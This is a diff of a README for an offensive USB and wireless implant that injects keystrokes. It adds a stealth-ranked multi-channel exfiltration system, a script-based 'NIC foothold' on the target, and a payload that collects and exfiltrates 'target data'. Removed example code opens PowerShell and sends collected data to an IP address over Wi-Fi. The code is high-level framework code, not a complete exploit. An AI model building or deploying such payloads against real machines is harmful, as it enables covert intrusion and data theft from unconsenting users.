@@ -18,6 +18,7 @@ This project leverages a powerful **dual-chip architecture** combining the **WCH
 - **Primary USB Interface**:
   - USB 3.0 SuperSpeed HID (keyboard/mouse)
   - USB 3.0 Mass Storage emulation
+  - USB Network Interface (NIC) for high-speed communication
   - U2F/FIDO2 security key emulation
 - **Storage Management**:
   - SD card interfacing via SPI
@@ -45,8 +46,22 @@ This project leverages a powerful **dual-chip architecture** combining the **WCH
 
 ## Key Features
 
+### ✅ Intelligent Multi-Vector Communication System
+- **Adaptive Channel Selection**: Automatically selects the best communication method based on speed, stealth, or reliability requirements
+- **Automatic Fallbacks**: Gracefully degrades to slower but more reliable channels when needed
+- **Channel Coordination**: Maintains connection state and performance metrics across all channels
+- **Parallel Operation**: Utilizes multiple channels simultaneously for maximum throughput
+- **USB 3.0 NIC Foothold**: Establishes high-speed network connection via USB for superior performance
+
+### ✅ Comprehensive Exfiltration System
+- **Multi-Priority Exfiltration**: Configurable priorities (speed, stealth, reliability)
+- **Chunked Data Transfers**: Handles large data sets efficiently
+- **Parallel Exfiltration**: Exfiltrates via multiple channels simultaneously
+- **Progress Tracking**: Monitors exfiltration status across channels
+- **Automatic Recovery**: Continues exfiltration after disruptions or channel failures
+
 ### ✅ SuperSpeed USB 3.0
-- **5 Gbps Data Transfer**: 10x faster than USB 2.0
+- **High-Bandwidth Data Transfer**: Significantly faster than USB 2.0
 - **Rapid Exfiltration**: Move large datasets quickly
 - **Enhanced Storage**: Function as a high-performance flash drive
 
@@ -57,7 +72,7 @@ This project leverages a powerful **dual-chip architecture** combining the **WCH
 - **Simultaneous Operation**: Run multiple protocols concurrently
 
 ### ✅ Unified LLVM Development Framework
-- **Language Flexibility**: C, C++, Rust, Python, and other LLVM languages
+- **Language Flexibility**: C, C++, Rust, Python, and Nim (all LLVM languages)
 - **Cross-Chip Framework**: Same languages for both processors
 - **Shared Codebase**: Common libraries across the system
 - **Modern Practices**: Use contemporary language features
@@ -82,10 +97,10 @@ This project leverages a powerful **dual-chip architecture** combining the **WCH
 - **USB-C Connector** for USB 3.0 connectivity
 - **Antennas** for Wi-Fi, BLE, and 802.15.4
 - **RGBW LED** for status indication
-- **IR Transceiver** (optional)
+- **IR Transceiver**
 - **RTC Module** with battery backup
 - **Push Button** for mode selection
-- **Hardware Security Element** (optional)
+- **Hardware Security Element**
 
 ## Software Components
 
@@ -94,10 +109,23 @@ This project leverages a powerful **dual-chip architecture** combining the **WCH
 - **Inter-Chip Communication Protocol**: Optimized for latency and throughput
 - **Unified Hardware Abstraction Layer**: Consistent API across both chips
 
+### Communication Framework
+- **Channel Management System**: Coordinates all communication methods
+- **Priority-Based Selection**: Automatically selects best available channel
+- **Channel Metrics**: Tracks relative speed, reliability, and stealth ratings
+- **Dynamic Adaptation**: Adjusts to changing conditions and connectivity
+
+### Exfiltration System
+- **Multi-Channel Exfiltration**: Coordinates data extraction across channels
+- **Chunked Transfer Protocol**: Handles arbitrarily large datasets
+- **Priority Options**: Speed, stealth, or reliability optimization
+- **Parallel Processing**: Multiple simultaneous exfiltration paths
+
 ### USB Capabilities (CH569)
 - **USB 3.0 SuperSpeed Stack**: Custom implementation for the CH569
 - **HID Profiles**: Advanced keyboard/mouse emulation
 - **Mass Storage Controller**: High-performance MSC implementation
+- **USB NIC**: Network interface for high-speed communication
 - **U2F/FIDO2 Stack**: Security key emulation
 
 ### Wireless Capabilities (ESP32-C6)
@@ -117,78 +145,32 @@ This project leverages a powerful **dual-chip architecture** combining the **WCH
 ```
 /firmware
  ├── common/                   # Shared code between chips
+ │   ├── comm_manager.h        # Communication channel abstraction
+ │   ├── comm_manager.c        # Core channel management
+ │   ├── exfiltration.h        # Exfiltration system interface
+ │   ├── exfiltration.c        # Exfiltration implementation
+ │   ├── foothold.h            # Foothold establishment interface
+ │   ├── foothold_common.c     # Common foothold code
  │   ├── payload_framework.h   # Core framework API
  │   ├── payload_framework.c   # Framework implementation
- │   ├── protocol.h            # Inter-chip communication protocol
- │   ├── protocol.c            # Protocol implementation
- │   ├── security.h            # Shared security primitives
+ │   ├── protocol.c            # Inter-chip communication protocol
  │   ├── security.c            # Security implementation
- │   ├── tests/                # Unit tests for common code
- │   ├── cmake/                # Common CMake modules
- │   └── CMakeLists.txt        # Build config for common module
+ │   ├── comm/                 # Communication modules
+ │   │   ├── spi_slave.h       # SPI interface
+ │   │   └── spi_slave.c       # SPI communication with ESP32
+ │   └── cmake/                # Common CMake modules
  │
  ├── ch569/                    # WCH CH569 USB controller code
- │   ├── main.c                # Main firmware for CH569
- │   ├── startup.c             # Startup code
- │   ├── system_ch569.c        # System initialization
- │   ├── ch569_hid.h           # HID interface
+ │   ├── ch569_foothold.c      # USB-specific foothold implementation
  │   ├── ch569_hid.c           # HID implementation
- │   ├── ch569_os_detect.h     # OS detection interface
- │   ├── ch569_os_detect.c     # OS detection implementation
- │   ├── config/               # Configuration files
- │   ├── usb/                  # USB functionality
- │   │   ├── usb_core.c        # USB 2.0 functionality 
- │   │   ├── usb3_core.c       # USB 3.0 core functionality
- │   │   ├── usb_descriptors.h # USB descriptors
- │   │   ├── hid.c             # Keyboard + Mouse
- │   │   ├── msc.c             # Mass Storage
- │   │   └── u2f.c             # U2F/FIDO2 implementation
- │   ├── storage/
- │   │   ├── sd_card.c         # SD card interface
- │   │   └── encryption.c      # Storage encryption
- │   ├── payload/
- │   │   ├── loader.c          # ELF loader
- │   │   └── executor.c        # Payload execution environment
- │   ├── comm/
- │   │   └── spi_slave.c       # SPI communication with ESP32
- │   ├── hardware/
- │   │   ├── leds.c            # LED control
- │   │   └── rtc.c             # Real-time clock functions
- │   ├── vendor/               # CH569 vendor-specific code
- │   │   └── ch569/
- │   │       ├── ch569_usb.h   # Vendor USB headers
- │   │       ├── ch569_gpio.h  # GPIO headers
- │   │       ├── peripheral/   # Peripheral drivers
- │   ├── ch569_link.ld         # Linker script
- │   ├── ch569_payload.ld      # Payload linker script
+ │   ├── os_detect_basic.c     # OS detection implementation
  │   └── CMakeLists.txt        # Build config for CH569
  │
  ├── esp32c6/                  # ESP32-C6 wireless controller code
- │   ├── main.c                # Main firmware for ESP32-C6
- │   ├── esp32c6_os_detect.h   # OS detection interface
- │   ├── esp32c6_os_detect.c   # OS detection implementation
- │   ├── config/               # Configuration files
- │   ├── wireless/
- │   │   ├── wifi.h            # Wi-Fi interface
- │   │   ├── wifi.c            # Wi-Fi functionality
- │   │   ├── ble.h             # BLE interface
- │   │   ├── ble.c             # Bluetooth LE stack
- │   │   ├── thread.h          # Thread interface
- │   │   └── thread.c          # 802.15.4/Thread implementation
- │   ├── comm/
- │   │   ├── spi_master.h      # SPI interface
+ │   ├── comm/                 # ESP32 communication
  │   │   └── spi_master.c      # SPI communication with CH569
- │   ├── web/
- │   │   ├── server.c          # Web configuration server
- │   │   └── api.c             # RESTful API for configuration
- │   ├── recon/
- │   │   ├── scanner.c         # Network reconnaissance
- │   │   └── analyzer.c        # Target analysis
- │   ├── security/
- │   │   ├── crypto.c          # Cryptographic operations
- │   │   └── secure_storage.c  # Protected key storage
- │   ├── sdkconfig.defaults    # ESP-IDF configuration
- │   ├── esp32c6_payload.ld    # Payload linker script
+ │   ├── wireless/             # Wireless functionality
+ │   │   └── wifi.c            # Wi-Fi implementation
  │   └── CMakeLists.txt        # Build config for ESP32-C6
  │
  ├── examples/                 # Example payloads
@@ -197,44 +179,47 @@ This project leverages a powerful **dual-chip architecture** combining the **WCH
  │   ├── wireless_payloads/    # Wireless-focused payloads
  │   │   └── wifi_recon.rs     # Rust example
  │   ├── combined_payloads/    # Multi-vector payloads
- │   │   └── exfiltration.cpp  # C++ example
+ │   │   ├── exfiltration.cpp  # C++ example
+ │   │   ├── multi_vector_exfil.c # Multi-vector exfiltration payload
+ │   │   └── test_interchip.c  # Inter-chip communication test
  │   ├── python_payloads/      # Python payloads
  │   │   └── os_detect.py      # Python example
+ │   ├── nim_payloads/         # Nim payloads
+ │   │   └── os_detect.nim     # Nim example
  │   └── CMakeLists.txt        # Build config for examples
  │
  ├── tools/                    # Development tools
- │   ├── payload_builder/      # Visual payload builder (Qt)
- │   │   ├── main.cpp
- │   │   ├── mainwindow.cpp
- │   │   ├── mainwindow.h
- │   │   └── ui/               # UI files
- │   ├── simulator/            # Payload simulator
- │   │   ├── main.cpp
- │   │   ├── usb_sim.cpp
- │   │   └── wireless_sim.cpp
+ │   ├── nim/                  # Nim compiler tools
+ │   │   ├── compile.py        # Nim compiler wrapper
+ │   │   └── bindings.c        # C bindings for Nim
  │   ├── pythran/              # Python-to-C compiler tools
  │   │   ├── compile.py        # Pythran compiler wrapper
- │   │   ├── bindings.cpp      # C bindings for Python
- │   │   └── templates/        # Code templates
- │   ├── flashers/             # Programming utilities
- │   │   ├── wch-flasher.py    # CH569 flasher
- │   │   ├── dual_flasher.cpp  # Combined flasher
- │   │   └── serial_port.cpp   # Serial port utilities
- │   └── CMakeLists.txt        # Build config for tools
+ │   │   └── bindings.cpp      # C++ bindings for Python
+ │   └── test_comm_manager.c   # Communication manager tests
  │
- ├── docs/                     # Documentation
- │   ├── api/                  # API reference
- │   ├── hardware/             # Hardware design docs
- │   └── tutorials/            # Tutorials and guides
- │
- ├── cmake/                    # CMake modules
- │   ├── ch569_toolchain.cmake # CH569-specific toolchain
- │   └── esp32c6_toolchain.cmake # ESP32-C6-specific toolchain
- │
- ├── build.sh                  # Build script helper
- ├── CMakeLists.txt            # Top-level CMake file
- └── README.md                 # Project documentation
+ └── cmake/                    # CMake modules
+     ├── ch569_toolchain.cmake # CH569-specific toolchain
+     └── esp32c6_toolchain.cmake # ESP32-C6-specific toolchain
 ```
+
+## Communication Channels
+
+The system supports multiple communication channels, ranked by priority:
+
+1. **USB Network Interface (NIC)**: Highest priority, high-bandwidth bidirectional communication
+2. **USB 3.0 Mass Storage**: High priority, very high bandwidth for data transfer
+3. **Wi-Fi**: High-medium priority, moderate wireless bandwidth with excellent stealth
+4. **Bluetooth**: Medium priority, lower wireless bandwidth with good stealth
+5. **HID Raw**: Medium-low priority, limited bandwidth but good compatibility
+6. **Mouse**: Low priority, very low bandwidth but somewhat stealthy
+7. **Keyboard**: Lowest priority, very low bandwidth but universally available fallback
+
+Each channel is assigned characteristics:
+- **Priority**: Lower number = higher priority
+- **Relative Speed**: Bandwidth ranking
+- **Stealth Rating**: 0-10 (higher = stealthier)
+- **Reliability**: 0-10 (higher = more reliable)
+- **Bidirectional**: Whether channel supports two-way communication
 
 ## Unified LLVM Development
 
@@ -253,225 +238,167 @@ clang -target riscv32-unknown-none-elf -mcpu=rv32imac -O2 \
 
 ### Multi-Vector Payload Example
 
-```cpp
-// shared_definitions.h - Used by both chips
-#pragma once
-
-enum PayloadTriggers {
-  TRIGGER_USB_CONNECTED,
-  TRIGGER_WIFI_TARGET_FOUND,
-  TRIGGER_BLUETOOTH_PROXIMITY,
-  TRIGGER_TIME_ELAPSED
-};
-
-struct PayloadContext {
-  uint8_t target_os;
-  uint8_t security_level;
-  uint32_t capabilities;
-  char hostname[32];
-};
-
-// USB Payload for CH569 (usb_component.c)
+```c
+// multi_vector_exfil.c
 #include "payload_framework.h"
-#include "shared_definitions.h"
+#include "comm_manager.h"
+#include "exfiltration.h"
 
-PAYLOAD_INFO("USB Keystrokes", "1.0", PAYLOAD_PRIORITY_HIGH);
+PAYLOAD_INFO("Multi-Vector Exfiltration", "1.0", PAYLOAD_PRIORITY_HIGH);
 
 void payload_main(PayloadContext* ctx) {
-  // Check target OS from context
-  if (ctx->target_os == OS_WINDOWS) {
-    // Send Windows-specific keystrokes
-    Keyboard::sendWinKey('r');
-    Keyboard::sendString("powershell");
-    Keyboard::sendKey(KEY_RETURN);
+    // Initialize status LED
+    StatusLED.setColor(255, 255, 0, 0); // Yellow - starting
     
-    // Signal wireless component to start its part
-    InterChip::triggerEvent(TRIGGER_USB_STAGE_COMPLETE);
-  }
-}
-
-// Wireless Payload for ESP32-C6 (wireless_component.c)
-#include "payload_framework.h"
-#include "shared_definitions.h"
-
-PAYLOAD_INFO("Wireless Exfiltration", "1.0", PAYLOAD_PRIORITY_NORMAL);
-
-void payload_main(PayloadContext* ctx) {
-  // Wait for signal from USB component
-  InterChip::waitForEvent(TRIGGER_USB_STAGE_COMPLETE);
-  
-  // Start wireless reconnaissance
-  WiFi::scanNetworks();
-  
-  // Establish connection and exfiltrate data
-  if (WiFi::connect("target_network", "password")) {
-    Exfiltration::sendData("192.168.1.100", 8080, CollectedData::getBuffer());
-  }
+    // Initialize communication and exfiltration systems
+    comm_manager_init();
+    exfil_init();
+    
+    // First try to establish NIC connection (highest bandwidth)
+    System.log("Attempting to establish NIC foothold...");
+    bool nic_success = establish_nic_foothold(ctx);
+    
+    if (nic_success) {
+        StatusLED.setColor(0, 255, 0, 0); // Green - NIC established
+        System.log("NIC foothold established successfully!");
+    } else {
+        StatusLED.setColor(0, 0, 255, 0); // Blue - using fallback
+        System.log("Using keyboard fallback for primary communication");
+    }
+    
+    // Initialize Mass Storage for data exfiltration
+    System.log("Initializing Mass Storage for exfiltration...");
+    if (mass_storage_init_full()) {
+        comm_channels[COMM_CHANNEL_MASS_STORAGE].status = CHANNEL_STATUS_CONNECTED;
+        System.log("Mass Storage ready for exfiltration");
+    }
+    
+    // Initialize wireless channels if available
+    if (System.isWirelessController() || ChipComm.isConnected()) {
+        // Initialize Wi-Fi and Bluetooth
+        // ...
+    }
+    
+    // Collect data to exfiltrate
+    System.log("Collecting target data...");
+    size_t data_size = 0;
+    uint8_t* data = collect_target_data(&data_size);
+    
+    // Queue for exfiltration with different priorities
+    exfil_queue_data("target_data", data, data_size, 
+                    EXFIL_PRIORITY_SPEED, true);
+    
+    // Process exfiltration until complete
+    while (!exfil_is_complete("target_data")) {
+        exfil_process_queue();
+        System.delay(100);
+    }
+    
+    // Clean up
+    free(data);
+    StatusLED.off();
 }
 ```
 
-## Python Payload Support
+## Exfiltration Priority Options
 
-The project supports writing payloads in Python through Pythran, a Python-to-C++ compiler that leverages LLVM. This allows you to write your payload logic in high-level Python code, which is then compiled to native code for optimal performance on the device.
+Data can be exfiltrated with different priorities:
+
+1. **EXFIL_PRIORITY_SPEED**: Uses fastest available channels
+2. **EXFIL_PRIORITY_STEALTH**: Uses stealthiest channels
+3. **EXFIL_PRIORITY_RELIABILITY**: Uses most reliable channels
+
+The system can exfiltrate data through multiple channels simultaneously, with automatic channel selection based on the chosen priority. If a channel fails, the system automatically falls back to alternative channels.
+
+## Foothold Establishment
+
+The system implements a sophisticated foothold establishment process:
+
+1. **Initial USB Connection**: Always available as baseline
+2. **NIC Foothold Attempt**: Executes OS-specific scripts to configure networking
+3. **Verification Process**: Confirms successful connectivity
+4. **Fallback Chain**: If NIC fails, falls back through other available channels
+
+OS-specific scripts are tailored for Windows, macOS, and Linux to ensure maximum compatibility.
+
+## Python and Nim Payload Support
+
+The project supports writing payloads in Python (via Pythran) and Nim - both compile to native code for optimal performance.
 
 ### Python Payload Example
 
 ```python
 # os_detect.py - Python payload for OS detection
-#pythran export payload_main(int*, str*, str*)
+#pythran export payload_main(int, int, int, str, str, int)
 
 # These constants match the C API
 OS_UNKNOWN = 0
 OS_WINDOWS = 1
 OS_MACOS = 2
 OS_LINUX = 3
-OS_CHROMEOS = 4
 
-# Key codes
-KEY_R = 0x15
-KEY_RETURN = 0x28
-KEY_SPACE = 0x2C
-KEY_T = 0x17
-
-# Modifiers
-MOD_LCTRL = 0x01
-MOD_LALT = 0x04
-MOD_LMETA = 0x08 # Windows/Command key
-
-def payload_main(context):
-    # Set LED to yellow during detection
+def payload_main(detected_os, security_level, target_capabilities, hostname, username, timestamp):
+    # Set LED to yellow during initialization
     led_set_color(255, 255, 0, 0)
     
-    # Get detected OS from context
-    detected_os = context["detected_os"]
-    
-    # Log detection confidence
-    log_message(f"OS Detection confidence: {os_get_confidence()}%")
+    # Log which controller we're running on
+    if system_is_usb_controller():
+        log_message("Running on USB controller")
+    else:
+        log_message("Running on Wireless controller")
     
     # Different actions based on detected OS
     if detected_os == OS_WINDOWS:
-        led_set_color(0, 0, 255, 0)  # Blue
-        log_message("Windows detected - opening PowerShell")
-        
-        # Send Win+R to open Run dialog
-        keyboard_tap_with_modifiers(KEY_R, MOD_LMETA)
-        system_delay(500)
-        
-        # Type PowerShell and press Enter
-        keyboard_send_string("powershell")
-        keyboard_tap(KEY_RETURN)
-        system_delay(1000)
-        
-        # Execute a simple command
-        keyboard_send_line("Get-ComputerInfo | Select-Object OsName, OsVersion")
-    
+        perform_windows_actions()
     elif detected_os == OS_MACOS:
-        led_set_color(0, 255, 0, 0)  # Green
-        log_message("macOS detected - opening Terminal")
-        
-        # Open Terminal with keyboard shortcut
-        keyboard_tap_with_modifiers(KEY_SPACE, MOD_LMETA)
-        system_delay(300)
-        keyboard_send_string("terminal")
-        system_delay(300)
-        keyboard_tap(KEY_RETURN)
-        system_delay(1000)
-        
-        # Execute a simple command
-        keyboard_send_line("sw_vers")
-    
+        perform_macos_actions()
     elif detected_os == OS_LINUX:
-        led_set_color(255, 0, 0, 0)  # Red
-        log_message("Linux detected - opening Terminal")
-        
-        # Open Terminal with keyboard shortcut (varies by distro)
-        keyboard_tap_with_modifiers(KEY_T, MOD_LCTRL | MOD_LALT)
-        system_delay(1000)
-        
-        # Execute a simple command
-        keyboard_send_line("uname -a && cat /etc/os-release")
-    
+        perform_linux_actions()
     else:
-        led_set_color(255, 0, 255, 0)  # Purple
-        log_message("Unknown OS or detection failed")
+        log_message("Unknown or unsupported OS")
     
-    # Wait 5 seconds before completing
-    system_delay(5000)
+    # Complete
     led_off()
     return 0
 ```
 
-### Compiling Python Payloads
+### Nim Payload Example
 
-Python payloads are compiled using our LLVM toolchain:
+```nim
+# os_detect.nim - Nim payload for OS detection
+{.passC: "-I../../firmware/common/include".}
+{.compile: "../../tools/nim/bindings.c".}
 
-```sh
-# Compile a Python payload
-./tools/pythran/compile.py examples/python_payloads/os_detect.py --target ch569
+# OS detection constants
+const
+  OS_UNKNOWN* = 0
+  OS_WINDOWS* = 1
+  OS_MACOS* = 2
+  OS_LINUX* = 3
 
-# This will:
-# 1. Use Pythran to compile the Python to C++
-# 2. Use Clang to compile the C++ to LLVM IR
-# 3. Link with the C API bindings
-# 4. Generate an ELF file compatible with the target chip
+# Main payload function
+proc payload_main*(ctx: ptr PayloadContext): int {.exportc.} =
+  # Set LED to yellow during initialization
+  led_set_color(255, 255, 0, 0)
+  
+  # Get current OS from context
+  let detectedOs = ctx.detected_os
+  
+  # Different actions based on detected OS
+  case detectedOs:
+    of OS_WINDOWS:
+      perform_windows_actions()
+    of OS_MACOS:
+      perform_macos_actions()
+    of OS_LINUX:
+      perform_linux_actions()
+    else:
+      log_message("Unknown or unsupported OS")
+  
+  # Complete
+  led_off()
+  return 0
 ```
-
-### Python API Bindings
-
-Our framework provides Python bindings to all core functionality:
-
-```python
-# Available Python API functions (map 1:1 to C functions)
-
-# Keyboard operations
-keyboard_press(key)
-keyboard_release(key)
-keyboard_tap(key)
-keyboard_press_modifier(modifiers)
-keyboard_release_modifier(modifiers)
-keyboard_tap_with_modifiers(key, modifiers)
-keyboard_send_string(text)
-keyboard_send_line(text)
-
-# LED control
-led_set_color(r, g, b, w)
-led_set_pattern(pattern)
-led_set_brightness(brightness)
-led_off()
-
-# System functions
-system_delay(ms)
-system_log(message)
-system_is_usb_controller()
-system_is_wireless_controller()
-
-# OS detection
-os_detect(flags)
-os_get_hostname()
-os_get_username()
-os_get_confidence()
-
-# Inter-chip communication
-interchip_trigger_event(event, data)
-interchip_wait_for_event(event, timeout_ms)
-interchip_send_data(channel, data)
-```
-
-### Python Payload Limitations
-
-The Pythran compiler supports most Python features needed for payloads:
-
-- ✅ Full support for control flow (if/for/while)
-- ✅ Functions and basic containers (lists, dicts)
-- ✅ String manipulation
-- ✅ Integer and floating-point operations
-- ✅ Integration with C API
-
-Unsupported features (generally not needed for payloads):
-- ❌ Dynamic code execution (eval/exec)
-- ❌ Complex class hierarchies and metaclasses
-- ❌ Dynamic imports
-- ❌ Some standard library modules
 
 ## Operation Modes
 
@@ -492,8 +419,8 @@ Unsupported features (generally not needed for payloads):
 
 ```sh
 # Clone repository
-git clone https://github.com/yourusername/advanced-rubber-ducky.git
-cd advanced-rubber-ducky
+git clone https://github.com/yourusername/usb-goose.git
+cd usb-goose
 
 # Build firmware for both chips
 mkdir build && cd build
@@ -507,163 +434,10 @@ wch-flasher -p /dev/ttyUSB0 -f ch569_firmware.bin
 esptool.py --chip esp32c6 --port /dev/ttyUSB1 write_flash 0x0 esp32c6_firmware.bin
 ```
 
-## Nim Payload Support
-
-The project also supports writing payloads in Nim, a statically typed language with Python-like syntax that compiles to C. Nim provides the readability of Python with the performance of compiled languages, making it excellent for embedded development.
-
-### Nim Payload Example
-
-```nim
-# os_detect.nim - Nim payload for OS detection
-#
-# This example demonstrates using Nim for USB Goose payloads
-# Nim provides Python-like syntax with static typing and
-# compile-time features, ideal for embedded development.
-
-# C bindings to the payload framework
-{.passC: "-I../../firmware/common/include".}
-{.compile: "../../tools/nim/bindings.c".}
-
-# OS detection constants
-const
-  OS_UNKNOWN* = 0
-  OS_WINDOWS* = 1
-  OS_MACOS* = 2
-  OS_LINUX* = 3
-
-# Key codes
-const
-  KEY_R* = 0x15
-  KEY_RETURN* = 0x28
-  KEY_SPACE* = 0x2C
-  KEY_T* = 0x17
-
-# Modifier keys
-const
-  MOD_LCTRL* = 0x01
-  MOD_LALT* = 0x04
-  MOD_LMETA* = 0x08  # Windows/Command key
-
-# PayloadContext structure
-type
-  PayloadContext* = object
-    detected_os*: int
-    security_level*: int
-    target_capabilities*: uint32
-    hostname*: array[32, char]
-    username*: array[32, char]
-    timestamp*: uint64
-    reserved*: array[32, uint8]
-
-# Import framework functions
-proc led_set_color*(r, g, b, w: cint) {.importc.}
-proc led_off*() {.importc.}
-proc keyboard_tap_with_modifiers*(key: cint, modifiers: cint) {.importc.}
-proc keyboard_send_string*(text: cstring) {.importc.}
-proc keyboard_tap*(key: cint) {.importc.}
-proc keyboard_send_line*(text: cstring) {.importc.}
-proc system_delay*(ms: cint) {.importc.}
-proc log_message*(message: cstring) {.importc.}
-
-# Main payload function - exported for C calling
-proc payload_main*(ctx: ptr PayloadContext): int {.exportc.} =
-  # Set LED to yellow during initialization
-  led_set_color(255, 255, 0, 0)
-  
-  # Get current OS from context
-  let detectedOs = ctx.detected_os
-  
-  # Different actions based on detected OS
-  case detectedOs:
-    of OS_WINDOWS:
-      led_set_color(0, 0, 255, 0)  # Blue for Windows
-      log_message("Windows detected - opening PowerShell")
-      
-      # Open Run dialog with Win+R
-      keyboard_tap_with_modifiers(KEY_R, MOD_LMETA)
-      system_delay(500)
-      
-      # Type PowerShell and press Enter
-      keyboard_send_string("powershell")
-      keyboard_tap(KEY_RETURN)
-      system_delay(1000)
-      
-      # Execute commands
-      keyboard_send_line("Get-ComputerInfo | Select-Object OsName, OsVersion")
-  
-  # Wait 5 seconds before completing
-  system_delay(5000)
-  led_off()
-  return 0
-```
-
-### Compiling Nim Payloads
-
-Nim payloads are compiled using our LLVM toolchain:
-
-```sh
-# Compile a Nim payload
-./tools/nim/compile.py examples/nim_payloads/os_detect.nim --target ch569
-
-# This will:
-# 1. Use Nim to compile the Nim code to C
-# 2. Use Clang to compile the C to LLVM IR
-# 3. Link with the C API bindings
-# 4. Generate an ELF file compatible with the target chip
-```
-
-### Nim Advantages
-
-1. **Static typing with type inference** - Catch errors at compile time while maintaining clean syntax
-2. **Memory safety features** - Prevents many common bugs
-3. **Compiled performance** - Native code execution speed
-4. **Python-like syntax** - Easy to read and write
-5. **Powerful metaprogramming** - Compile-time code generation and optimization
-6. **Low-level control** - Direct memory access when needed
-7. **Small output binaries** - Efficient for embedded platforms
-
-### Nim API Bindings
-
-The framework provides Nim bindings to all core functionality with the same function names as our C API:
-
-```nim
-# Available Nim API functions
-
-# Keyboard operations
-proc keyboard_press*(key: cint) {.importc.}
-proc keyboard_release*(key: cint) {.importc.}
-proc keyboard_tap*(key: cint) {.importc.}
-proc keyboard_press_modifier*(modifiers: cint) {.importc.}
-proc keyboard_release_modifier*(modifiers: cint) {.importc.}
-proc keyboard_tap_with_modifiers*(key: cint, modifiers: cint) {.importc.}
-proc keyboard_send_string*(text: cstring) {.importc.}
-proc keyboard_send_line*(text: cstring) {.importc.}
-
-# LED control
-proc led_set_color*(r, g, b, w: cint) {.importc.}
-proc led_set_pattern*(pattern: cint) {.importc.}
-proc led_set_brightness*(brightness: cint) {.importc.}
-proc led_off*() {.importc.}
-
-# System functions
-proc system_delay*(ms: cint) {.importc.}
-proc log_message*(message: cstring) {.importc.}
-proc system_is_usb_controller*(): bool {.importc.}
-proc system_is_wireless_controller*(): bool {.importc.}
-
-# OS detection
-proc os_detect*(flags: cint): cint {.importc.}
-proc os_get_hostname*(buffer: cstring, max_len: cint): bool {.importc.}
-proc os_get_username*(buffer: cstring, max_len: cint): bool {.importc.}
-proc os_get_confidence*(): cint {.importc.}
-
-# Inter-chip communication
-proc interchip_trigger_event*(event: cint, data: pointer, data_len: cint): bool {.importc.}
-proc interchip_wait_for_event*(event: cint, timeout_ms: cint): bool {.importc.}
-proc interchip_send_data*(channel: cint, data: pointer, data_len: cint): bool {.importc.}
-```
-
 ## Future Enhancements
 
+- **Enhanced foothold techniques** for various environments
+- **Additional exfiltration channels** and protocols
+- **Encrypted channel communications**
 - **AI-powered targeting** using ESP32's ML capabilities
-- **Physical penetration** hardware extensions
+- **Physical penetration hardware extensions**
